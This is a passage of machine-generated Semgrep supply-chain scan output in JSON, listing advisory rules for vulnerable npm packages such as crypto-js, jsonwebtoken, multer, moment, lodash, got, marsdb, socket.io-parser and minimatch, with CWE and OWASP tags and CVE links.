forgery."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-0c587c32-681e-1011-91d9-b83299f66ccc","id":"ssc-0c587c32-681e-1011-91d9-b83299f66ccc","name":"ssc-0c587c32-681e-1011-91d9-b83299f66ccc","properties":{"precision":"very-high","tags":["CWE-347: Improper Verification of Cryptographic Signature","HIGH CONFIDENCE","OWASP-A02:2021 - Cryptographic Failures","OWASP-A04:2025 - Cryptographic Failures","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-0c587c32-681e-1011-91d9-b83299f66ccc"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of crypto-js are vulnerable to Use Of Weak Hash / Use Of Password Hash With Insufficient Computational Effort. The vulnerability in Crypto-js PBKDF2 is 1,000 times weaker than originally specified in 1993 and at least 1,300,000 times weaker than the current industry standard due to its default use of the insecure SHA1 hash algorithm and a single iteration, which poses a significant risk, potentially enabling attackers to create identical cryptographic signatures for known and unknown values when given control of a portion of the input, thereby impacting password protection and signature generation applications"},"help":{"markdown":"Affected versions of crypto-js are vulnerable to Use Of Weak Hash / Use Of Password Hash With Insufficient Computational Effort. The vulnerability in Crypto-js PBKDF2 is 1,000 times weaker than originally specified in 1993 and at least 1,300,000 times weaker than the current industry standard due to its default use of the insecure SHA1 hash algorithm and a single iteration, which poses a significant risk, potentially enabling attackers to create identical cryptographic signatures for known and unknown values when given control of a portion of the input, thereby impacting password protection and signature generation applications\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-0ccd6fe9-299d-49ec-8ad2-d1139d0234ea)\n - [https://github.com/advisories/GHSA-xwcq-pm8m-c4vf](https://github.com/advisories/GHSA-xwcq-pm8m-c4vf)\n - [https://nvd.nist.gov/vuln/detail/CVE-2023-46233](https://nvd.nist.gov/vuln/detail/CVE-2023-46233)\n","text":"Affected versions of crypto-js are vulnerable to Use Of Weak Hash / Use Of Password Hash With Insufficient Computational Effort. The vulnerability in Crypto-js PBKDF2 is 1,000 times weaker than originally specified in 1993 and at least 1,300,000 times weaker than the current industry standard due to its default use of the insecure SHA1 hash algorithm and a single iteration, which poses a significant risk, potentially enabling attackers to create identical cryptographic signatures for known and unknown values when given control of a portion of the input, thereby impacting password protection and signature generation applications"},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-0ccd6fe9-299d-49ec-8ad2-d1139d0234ea","id":"ssc-0ccd6fe9-299d-49ec-8ad2-d1139d0234ea","name":"ssc-0ccd6fe9-299d-49ec-8ad2-d1139d0234ea","properties":{"precision":"very-high","tags":["CWE-327: Use of a Broken or Risky Cryptographic Algorithm","CWE-328: Use of Weak Hash","CWE-916: Use of Password Hash With Insufficient Computational Effort","HIGH CONFIDENCE","OWASP-A02:2021 - Cryptographic Failures","OWASP-A03:2017 - Sensitive Data Exposure","OWASP-A04:2025 - Cryptographic Failures","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-0ccd6fe9-299d-49ec-8ad2-d1139d0234ea"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Affected versions of jsonwebtoken are vulnerable to Improper Authentication. Insecure implementation of key retrieval function could lead to Forgeable Public/Private Tokens from RSA to HMAC."},"help":{"markdown":"Affected versions of jsonwebtoken are vulnerable to Improper Authentication. Insecure implementation of key retrieval function could lead to Forgeable Public/Private Tokens from RSA to HMAC.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-1676dcdc-09e4-4f68-8fa8-5ff232a5b53f)\n - [https://github.com/advisories/GHSA-hjrf-2m68-5959](https://github.com/advisories/GHSA-hjrf-2m68-5959)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-23541](https://nvd.nist.gov/vuln/detail/CVE-2022-23541)\n","text":"Affected versions of jsonwebtoken are vulnerable to Improper Authentication. Insecure implementation of key retrieval function could lead to Forgeable Public/Private Tokens from RSA to HMAC."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-1676dcdc-09e4-4f68-8fa8-5ff232a5b53f","id":"ssc-1676dcdc-09e4-4f68-8fa8-5ff232a5b53f","name":"ssc-1676dcdc-09e4-4f68-8fa8-5ff232a5b53f","properties":{"precision":"very-high","tags":["CWE-1259: Improper Restriction of Security Token Assignment","CWE-287: Improper Authentication","HIGH CONFIDENCE","OWASP-A02:2017 - Broken Authentication","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-1676dcdc-09e4-4f68-8fa8-5ff232a5b53f"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Affected versions of jsonwebtoken are vulnerable to Improper Authentication / Use Of A Broken Or Risky Cryptographic Algorithm / Improper Verification Of Cryptographic Signature. The lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. Users are affected only if ALL of the following conditions are true for the `jwt.verify()` function: 1. A token with no signature is received. 2. No algorithms are specified. 3. A falsy (e.g., null, false, undefined) secret or key is passed."},"help":{"markdown":"Affected versions of jsonwebtoken are vulnerable to Improper Authentication / Use Of A Broken Or Risky Cryptographic Algorithm / Improper Verification Of Cryptographic Signature. The lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. Users are affected only if ALL of the following conditions are true for the `jwt.verify()` function: 1. A token with no signature is received. 2. No algorithms are specified. 3. A falsy (e.g., null, false, undefined) secret or key is passed.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-1803e88e-a31c-43e2-99d5-f0b14e50ba0e)\n - [https://github.com/advisories/GHSA-qwph-4952-7xr6](https://github.com/advisories/GHSA-qwph-4952-7xr6)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-23540](https://nvd.nist.gov/vuln/detail/CVE-2022-23540)\n","text":"Affected versions of jsonwebtoken are vulnerable to Improper Authentication / Use Of A Broken Or Risky Cryptographic Algorithm / Improper Verification Of Cryptographic Signature. The lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. Users are affected only if ALL of the following conditions are true for the `jwt.verify()` function: 1. A token with no signature is received. 2. No algorithms are specified. 3. A falsy (e.g., null, false, undefined) secret or key is passed."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-1803e88e-a31c-43e2-99d5-f0b14e50ba0e","id":"ssc-1803e88e-a31c-43e2-99d5-f0b14e50ba0e","name":"ssc-1803e88e-a31c-43e2-99d5-f0b14e50ba0e","properties":{"precision":"very-high","tags":["CWE-287: Improper Authentication","CWE-327: Use of a Broken or Risky Cryptographic Algorithm","CWE-347: Improper Verification of Cryptographic Signature","HIGH CONFIDENCE","OWASP-A02:2017 - Broken Authentication","OWASP-A02:2021 - Cryptographic Failures","OWASP-A03:2017 - Sensitive Data Exposure","OWASP-A04:2025 - Cryptographic Failures","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-1803e88e-a31c-43e2-99d5-f0b14e50ba0e"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of multer are vulnerable to Missing Release of Memory after Effective Lifetime. Multer improperly handles errors during file uploads: when an HTTP stream error occurs, it fails to close its internal streaming processor. Over time, this leaves unclosed streams that accumulate and exhaust memory and file descriptors, potentially leading to a denial of service scenario requiring manual intervention."},"help":{"markdown":"Affected versions of multer are vulnerable to Missing Release of Memory after Effective Lifetime. Multer improperly handles errors during file uploads: when an HTTP stream error occurs, it fails to close its internal streaming processor. Over time, this leaves unclosed streams that accumulate and exhaust memory and file descriptors, potentially leading to a denial of service scenario requiring manual intervention.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-1e5de89e-d770-cf32-0d29-8ff36b660fee)\n - [https://github.com/advisories/GHSA-44fp-w29j-9vj5](https://github.com/advisories/GHSA-44fp-w29j-9vj5)\n - [https://nvd.nist.gov/vuln/detail/CVE-2025-47935](https://nvd.nist.gov/vuln/detail/CVE-2025-47935)\n","text":"Affected versions of multer are vulnerable to Missing Release of Memory after Effective Lifetime. Multer improperly handles errors during file uploads: when an HTTP stream error occurs, it fails to close its internal streaming processor. Over time, this leaves unclosed streams that accumulate and exhaust memory and file descriptors, potentially leading to a denial of service scenario requiring manual intervention."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-1e5de89e-d770-cf32-0d29-8ff36b660fee","id":"ssc-1e5de89e-d770-cf32-0d29-8ff36b660fee","name":"ssc-1e5de89e-d770-cf32-0d29-8ff36b660fee","properties":{"precision":"very-high","tags":["CWE-401: Missing Release of Memory after Effective Lifetime","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-1e5de89e-d770-cf32-0d29-8ff36b660fee"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale. This problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive)."},"help":{"markdown":"This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale. This problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-23ec9966-e7e6-442b-8458-ef400508a970)\n - [https://github.com/advisories/GHSA-8hfj-j24r-96c4](https://github.com/advisories/GHSA-8hfj-j24r-96c4)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-24785](https://nvd.nist.gov/vuln/detail/CVE-2022-24785)\n","text":"This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale. This problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive)."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-23ec9966-e7e6-442b-8458-ef400508a970","id":"ssc-23ec9966-e7e6-442b-8458-ef400508a970","name":"ssc-23ec9966-e7e6-442b-8458-ef400508a970","properties":{"precision":"very-high","tags":["CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","CWE-27: Path Traversal: 'dir/../../filename'","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-23ec9966-e7e6-442b-8458-ef400508a970"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of lodash are vulnerable to Uncontrolled Resource Consumption. Vulnerable functions allow a malicious user to cause the addition or modification of an existing proprty that exists on all objects."},"help":{"markdown":"Affected versions of lodash are vulnerable to Uncontrolled Resource Consumption. Vulnerable functions allow a malicious user to cause the addition or modification of an existing proprty that exists on all objects.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-29317a8b-48ec-4715-9dc0-a658e559fa23)\n - [https://github.com/advisories/GHSA-4xc9-xhrj-v574](https://github.com/advisories/GHSA-4xc9-xhrj-v574)\n - [https://nvd.nist.gov/vuln/detail/CVE-2018-16487](https://nvd.nist.gov/vuln/detail/CVE-2018-16487)\n","text":"Affected versions of lodash are vulnerable to Uncontrolled Resource Consumption. Vulnerable functions allow a malicious user to cause the addition or modification of an existing proprty that exists on all objects."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-29317a8b-48ec-4715-9dc0-a658e559fa23","id":"ssc-29317a8b-48ec-4715-9dc0-a658e559fa23","name":"ssc-29317a8b-48ec-4715-9dc0-a658e559fa23","properties":{"precision":"very-high","tags":["CWE-400: Uncontrolled Resource Consumption","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-29317a8b-48ec-4715-9dc0-a658e559fa23"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of moment are vulnerable to Uncontrolled Resource Consumption. A low-severity regular-expression denial-of-service exists in Moment.js's date-string parser. The unanchored, unbounded regex used to recognize alphabetic or locale-specific date tokens can be tricked into catastrophic backtracking by a long, crafted input string. An attacker supplying such a string to `moment(<string>)` can cause high CPU usage and effectively DoS the host process."},"help":{"markdown":"Affected versions of moment are vulnerable to Uncontrolled Resource Consumption. A low-severity regular-expression denial-of-service exists in Moment.js's date-string parser. The unanchored, unbounded regex used to recognize alphabetic or locale-specific date tokens can be tricked into catastrophic backtracking by a long, crafted input string. An attacker supplying such a string to `moment(<string>)` can cause high CPU usage and effectively DoS the host process.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-30a9db12-fb6e-4dd4-85b8-cf268e95f2d6)\n - [https://github.com/advisories/GHSA-446m-mv8f-q348](https://github.com/advisories/GHSA-446m-mv8f-q348)\n - [https://nvd.nist.gov/vuln/detail/CVE-2017-18214](https://nvd.nist.gov/vuln/detail/CVE-2017-18214)\n","text":"Affected versions of moment are vulnerable to Uncontrolled Resource Consumption. A low-severity regular-expression denial-of-service exists in Moment.js's date-string parser. The unanchored, unbounded regex used to recognize alphabetic or locale-specific date tokens can be tricked into catastrophic backtracking by a long, crafted input string. An attacker supplying such a string to `moment(<string>)` can cause high CPU usage and effectively DoS the host process."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-30a9db12-fb6e-4dd4-85b8-cf268e95f2d6","id":"ssc-30a9db12-fb6e-4dd4-85b8-cf268e95f2d6","name":"ssc-30a9db12-fb6e-4dd4-85b8-cf268e95f2d6","properties":{"precision":"very-high","tags":["CWE-400: Uncontrolled Resource Consumption","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-30a9db12-fb6e-4dd4-85b8-cf268e95f2d6"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of jsonwebtoken are vulnerable to Use Of A Broken Or Risky Cryptographic Algorithm. The library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm."},"help":{"markdown":"Affected versions of jsonwebtoken are vulnerable to Use Of A Broken Or Risky Cryptographic Algorithm. The library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-30d12dd5-94ad-46fa-9d32-3d5477d86f3e)\n - [https://github.com/advisories/GHSA-8cf7-32gw-wr33](https://github.com/advisories/GHSA-8cf7-32gw-wr33)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-23539](https://nvd.nist.gov/vuln/detail/CVE-2022-23539)\n","text":"Affected versions of jsonwebtoken are vulnerable to Use Of A Broken Or Risky Cryptographic Algorithm. The library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-30d12dd5-94ad-46fa-9d32-3d5477d86f3e","id":"ssc-30d12dd5-94ad-46fa-9d32-3d5477d86f3e","name":"ssc-30d12dd5-94ad-46fa-9d32-3d5477d86f3e","properties":{"precision":"very-high","tags":["CWE-327: Use of a Broken or Risky Cryptographic Algorithm","HIGH CONFIDENCE","OWASP-A02:2021 - Cryptographic Failures","OWASP-A03:2017 - Sensitive Data Exposure","OWASP-A04:2025 - Cryptographic Failures","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-30d12dd5-94ad-46fa-9d32-3d5477d86f3e"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Affected versions of got are vulnerable to URL Redirection to Untrusted Site ('Open Redirect'). The vulnerability is the susceptibility to Open Redirect, stemming from the absence of verification for requested URLs, thereby enabling redirection of victims to a UNIX socket."},"help":{"markdown":"Affected versions of got are vulnerable to URL Redirection to Untrusted Site ('Open Redirect'). The vulnerability is the susceptibility to Open Redirect, stemming from the absence of verification for requested URLs, thereby enabling redirection of victims to a UNIX socket.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-344eb659-8205-4af4-a52a-803ac2d821d0)\n - [https://github.com/advisories/GHSA-pfrx-2q88-qq97](https://github.com/advisories/GHSA-pfrx-2q88-qq97)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-33987](https://nvd.nist.gov/vuln/detail/CVE-2022-33987)\n","text":"Affected versions of got are vulnerable to URL Redirection to Untrusted Site ('Open Redirect'). The vulnerability is the susceptibility to Open Redirect, stemming from the absence of verification for requested URLs, thereby enabling redirection of victims to a UNIX socket."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-344eb659-8205-4af4-a52a-803ac2d821d0","id":"ssc-344eb659-8205-4af4-a52a-803ac2d821d0","name":"ssc-344eb659-8205-4af4-a52a-803ac2d821d0","properties":{"precision":"very-high","tags":["CWE-601: URL Redirection to Untrusted Site ('Open Redirect')","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-344eb659-8205-4af4-a52a-803ac2d821d0"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of multer are vulnerable to Uncaught Exception. Multer does not handle malformed multipart upload requests correctly. A crafted request can trigger an unhandled error during file parsing, crashing the application and leading to a denial of service."},"help":{"markdown":"Affected versions of multer are vulnerable to Uncaught Exception. Multer does not handle malformed multipart upload requests correctly. A crafted request can trigger an unhandled error during file parsing, crashing the application and leading to a denial of service.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-3727c4eb-234c-19a7-635f-e375d4558b71)\n - [https://github.com/advisories/GHSA-4pg4-qvpc-4q3h](https://github.com/advisories/GHSA-4pg4-qvpc-4q3h)\n - [https://nvd.nist.gov/vuln/detail/CVE-2025-47944](https://nvd.nist.gov/vuln/detail/CVE-2025-47944)\n","text":"Affected versions of multer are vulnerable to Uncaught Exception. Multer does not handle malformed multipart upload requests correctly. A crafted request can trigger an unhandled error during file parsing, crashing the application and leading to a denial of service."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-3727c4eb-234c-19a7-635f-e375d4558b71","id":"ssc-3727c4eb-234c-19a7-635f-e375d4558b71","name":"ssc-3727c4eb-234c-19a7-635f-e375d4558b71","properties":{"precision":"very-high","tags":["CWE-248: Uncaught Exception","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-3727c4eb-234c-19a7-635f-e375d4558b71"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected version of marsdb is vulnerable to Improper Neutralization Of Special Elements Used In A Command ('Command Injection') due to unsanitized selectors being passed to a function constructor."},"help":{"markdown":"Affected version of marsdb is vulnerable to Improper Neutralization Of Special Elements Used In A Command ('Command Injection') due to unsanitized selectors being passed to a function constructor.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-3e3fce71-fce7-4711-bf72-5e337f753066)\n - [https://github.com/advisories/GHSA-5mrr-rgp6-x4gr](https://github.com/advisories/GHSA-5mrr-rgp6-x4gr)\n","text":"Affected version of marsdb is vulnerable to Improper Neutralization Of Special Elements Used In A Command ('Command Injection') due to unsanitized selectors being passed to a function constructor."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-3e3fce71-fce7-4711-bf72-5e337f753066","id":"ssc-3e3fce71-fce7-4711-bf72-5e337f753066","name":"ssc-3e3fce71-fce7-4711-bf72-5e337f753066","properties":{"precision":"very-high","tags":["CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')","HIGH CONFIDENCE","OWASP-A01:2017 - Injection","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-3e3fce71-fce7-4711-bf72-5e337f753066"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"socket.io-parser versions >= 4.0.4 before 4.2.3, >= 3.4.0 before 3.4.3 are vulnerable to Improper Check or Handling of Exceptional Conditions. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO serve during decoding, thus killing the Node.js process."},"help":{"markdown":"socket.io-parser versions >= 4.0.4 before 4.2.3, >= 3.4.0 before 3.4.3 are vulnerable to Improper Check or Handling of Exceptional Conditions. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO serve during decoding, thus killing the Node.js process.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-3f91adfe-244f-49f3-b9b5-f3e516b1bf09)\n - [https://github.com/advisories/GHSA-cqmj-92xf-r6r9](https://github.com/advisories/GHSA-cqmj-92xf-r6r9)\n - [https://nvd.nist.gov/vuln/detail/CVE-2023-32695](https://nvd.nist.gov/vuln/detail/CVE-2023-32695)\n","text":"socket.io-parser versions >= 4.0.4 before 4.2.3, >= 3.4.0 before 3.4.3 are vulnerable to Improper Check or Handling of Exceptional Conditions. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO serve during decoding, thus killing the Node.js process."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-3f91adfe-244f-49f3-b9b5-f3e516b1bf09","id":"ssc-3f91adfe-244f-49f3-b9b5-f3e516b1bf09","name":"ssc-3f91adfe-244f-49f3-b9b5-f3e516b1bf09","properties":{"precision":"very-high","tags":["CWE-20: Improper Input Validation","CWE-248: Uncaught Exception","CWE-703: Improper Check or Handling of Exceptional Conditions","CWE-754: Improper Check for Unusual or Exceptional Conditions","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-3f91adfe-244f-49f3-b9b5-f3e516b1bf09"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the process."},"help":{"markdown":"Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the process.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-40d82dae-3e96-1f67-fcf3-417f7f234067)\n - [https://github.com/advisories/GHSA-3ppc-4f35-3m26](https://github.com/advisories/GHSA-3ppc-4f35-3m26)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-26996](https://nvd.nist.gov/vuln/detail/CVE-2026-26996)\n","text":"Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the process."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-40d82dae-3e96-1f67-fcf3-417f7f234067","id":"ssc-40d82dae-3e96-1f67-fcf3-417f7f234067","name":"ssc-40d82dae-3e96-1f67-fcf3-417f7f234067","properties":{"precision":"very-high","tags":["CWE-1333: Inefficient Regular Expression Complexity","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-40d82dae-3e96-1f67-fcf3-417f7f234067"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of moment are vulnerable to Uncontrolled Resource Consumption. A low-severity regular-expression denial-of-service exists in Moment.js's date-string parser. The unanchored, unbounded regex used to recognize alphabetic or locale-specific date tokens can be tricked into catastrophic backtracking by a long, crafted input string. An attacker supplying such a string to `moment(<string>)` can cause high CPU usage and effectively DoS the host process."},"help":{"markdown":"Affected versions of moment are vulnerable to Uncontrolled Resource Consumption. A low-severity regular-expression denial-of-service exists in Moment.js's date-string parser. The unanchored, unbounded regex used to recognize alphabetic or locale-specific date tokens can be tricked into catastrophic backtracking by a long, crafted input string. An attacker supplying such a string to `moment(<string>)` can cause high CPU usage and effectively DoS the host process.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-4141e829-81a8-8dcd-77b9-c93ce9d6f915)\n - [https://github.com/advisories/GHSA-446m-mv8f-q348](https://github.com/advisories/GHSA-446m-mv8f-q348)\n - [https://nvd.nist.gov/vuln/detail/CVE-2017-18214](https://nvd.nist.gov/vuln/detail/CVE-2017-18214)\n","text":"Affected versions of moment are vulnerable to Uncontrolled Resource Consumption. A low-severity regular-expression denial-of-service exists in Moment.js's date-string parser. The unanchored, unbounded regex used to recognize alphabetic or locale-specific date tokens can be tricked into catastrophic backtracking by a long, crafted input string. An attacker supplying such a string to `moment(<string>)` can cause high CPU usage and effectively DoS the host process."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-4141e829-81a8-8dcd-77b9-c93ce9d6f915","id":"ssc-4141e829-81a8-8dcd-77b9-c93ce9d6f915","name":"ssc-4141e829-81a8-8dcd-77b9-c93ce9d6f915","properties":{"precision":"very-high","tags":["CWE-400: Uncontrolled Resource Consumption","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-4141e829-81a8-8dcd-77b9-c93ce9d6f915"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of lodash, lodash-es, lodash.pick, lodash.set, lodash.setwith, lodash.update, and lodash.updatewith are vulnerable to Allocation of Resources Without Limits or Throttling / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The function `zipObjectDeep` allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays. This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances. Note that the Lodash per-method packages (lodash.pick, .set, .setWith, .update, .updateWith) have no fix version and cannot be upgraded to fix this vulnerability. Instead, you have to use the main `lodash` package and import your desired methods from that (e.g. `const pick = require(\"lodash/pick\");` or `import { pick } from \"lodash\";`)."},"help":{"markdown":"Affected versions of lodash, lodash-es, lodash.pick, lodash.set, lodash.setwith, lodash.update, and lodash.updatewith are vulnerable to Allocation of Resources Without Limits or Throttling / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The function `zipObjectDeep` allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays. This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances. Note that the Lodash per-method packages (lodash.pick, .set, .setWith, .update, .updateWith) have no fix version and cannot be upgraded to fix this vulnerability. Instead, you have to use the main `lodash` package and import your desired methods from that (e.g. `const pick = require(\"lodash/pick\");` or `import { pick } from \"lodash\";`).\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-4d530ee8-c246-47d7-96cc-3117cbac7cd2)\n - [https://github.com/advisories/GHSA-p6mc-m468-83gw](https://github.com/advisories/GHSA-p6mc-m468-83gw)\n - [https://lodash.com/per-method-packages](https://lodash.com/per-method-packages)\n - [https://nvd.nist.gov/vuln/detail/CVE-2020-8203](https://nvd.nist.gov/vuln/detail/CVE-2020-8203)\n","text":"Affected versions of lodash, lodash-es, lodash.pick, lodash.set, lodash.setwith, lodash.update, and lodash.updatewith are vulnerable to Allocation of Resources Without Limits or Throttling / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The function `zipObjectDeep` allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays. This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances. Note that the Lodash per-method packages (lodash.pick, .set, .setWith, .update, .updateWith) have no fix version and cannot be upgraded to fix this vulnerability. Instead, you have to use the main `lodash` package and import your desired methods from that (e.g. `const pick = require(\"lodash/pick\");` or `import { pick } from 